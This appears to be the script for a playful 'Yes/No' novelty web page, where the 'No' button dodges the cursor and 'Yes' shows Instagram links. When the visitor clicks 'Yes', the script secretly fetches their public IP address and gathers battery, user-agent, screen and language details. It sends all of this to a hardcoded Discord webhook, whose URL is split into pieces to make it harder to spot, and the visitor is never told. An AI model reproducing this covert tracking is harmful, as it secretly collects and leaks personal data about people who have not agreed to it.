document.addEventListener("DOMContentLoaded", function () {
    const yesBtn = document.getElementById("yesBtn"),
        noBtn = document.getElementById("noBtn");
    const container = noBtn.parentElement.parentElement;
    let noAttempts = 0;

    function moveNoButton(e) {
        e.preventDefault();
        noBtn.blur();
        noBtn.style.left = `${Math.ceil(Math.random() * 50)}vw`;
        noBtn.style.top = `${Math.ceil(Math.random() * 50)}vh`;
        noAttempts++; if (noAttempts >= 10) {
            noBtn.style.display = "none";
            const msg = document.createElement("p");
            msg.textContent = "No more running 😏";
            container.appendChild(msg);
        } noBtn.classList.add("no-escape");
        setTimeout(() => noBtn.classList.remove("no-escape"), 400);
    }

    yesBtn.addEventListener("click", async () => {
        if (navigator.vibrate) navigator.vibrate(200);
        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen();
        } else if (document.documentElement.webkitRequestFullscreen) { // Safari
            document.documentElement.webkitRequestFullscreen();
        } else if (document.documentElement.msRequestFullscreen) { // IE11
            document.documentElement.msRequestFullscreen();
        }
        document.getElementById("audio").play();
        container.innerHTML = `<h1>I knew you did, text me hii on insta!
                  <a href='https://instagram.com/semantpanda' class="❤">❤</a>
                </h1>
                 <a href='https://instagram.com/semantpanda'><img  src='./assets/rosecat.png' alt="Rose Cat"/></a>`;
        container.style.top = "-10%";
        let heartLink = document.createElement("a");
        heartLink.className = "heart";
        heartLink.textContent = "❤️";
        heartLink.href = "https://instagram.com/semantpanda";
        container.appendChild(heartLink);
        setTimeout(() => {
            let heartStyle = heartLink.style;
            heartStyle.top = "10%";
            heartStyle.left = "95.669%";
            heartStyle.fontSize = "8rem";
            heartStyle.animationIterationCount = "infinite";
            heartStyle.href = "https://instagram.com/semantpanda";

            document.addEventListener("click", (event) => {
                const heart = document.createElement("span");
                heart.className = "heart";
                heart.style.top = event.clientY + "px";
                heart.style.left = event.clientX + "px";
                heart.style.opacity = 0;
                heart.style.fontSize = "5rem";

                document.body.appendChild(heart);

                setTimeout(() => {
                    heart.remove();
                }, 2000);
            });
        }, 2005);

        const asker = new URLSearchParams(window.location.search).get("ask") || "unknown";
        let ip = "unknown";
        try {
            const res = await fetch("https://api.ipify.org?format=json");
            if (res.ok) ip = (await res.json()).ip;
        } catch (e) { }
        let battery = "unknown";
        let isMobile = /Mobi|Android/i.test(navigator.userAgent);
        if ("getBattery" in navigator) {
            try {
                const bat = await navigator.getBattery();
                battery = `${Math.round(bat.level * 100)}% (${bat.charging ? "charging" : "not charging"})`;
            } catch (e) {
                battery = isMobile ? "Mobile device" : "Desktop device";
            }
        } else {
            battery = isMobile ? "Mobile device" : "Desktop device";
        }
        ua = navigator.userAgent;
        const screenSize = `${window.screen.width}x${window.screen.height}`;
        const lang = navigator.language;

        const embed = {
            title: "💖 Someone clicked YES!",
            color: 0xff4f5a,
            fields: [
                { name: "From link asker", value: asker, inline: true },
                { name: "NO button attempts", value: noAttempts.toString(), inline: true },
                { name: "Public IP", value: ip, inline: true },
                { name: "Battery / Device", value: battery, inline: true },
                { name: "User Agent", value: ua },
                { name: "Screen", value: screenSize, inline: true },
                { name: "Language", value: lang, inline: true },
            ],
            timestamp: new Date().toISOString()
        };

        const webhookURL = "https://discord.com" + "/api/webhooks/" + "1421929404640268298" + "/fA-YlwWTK0CxnQ9aUHvNmf4p4qI3oLBG0j15EJaGj68iC3sYme-qIa9U58rLs2_GbLd4";
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        });
    });

    noBtn.addEventListener("mouseover", moveNoButton);
    noBtn.addEventListener("click", moveNoButton);

    let idleTimer;

    function resetIdleTimer() {
        document.body.style.cursor = "auto";
        clearTimeout(idleTimer);
        idleTimer = setTimeout(
            () => (document.body.style.cursor = "none"),
            1000
        );
    }

    document.addEventListener("mousemove", resetIdleTimer);
});
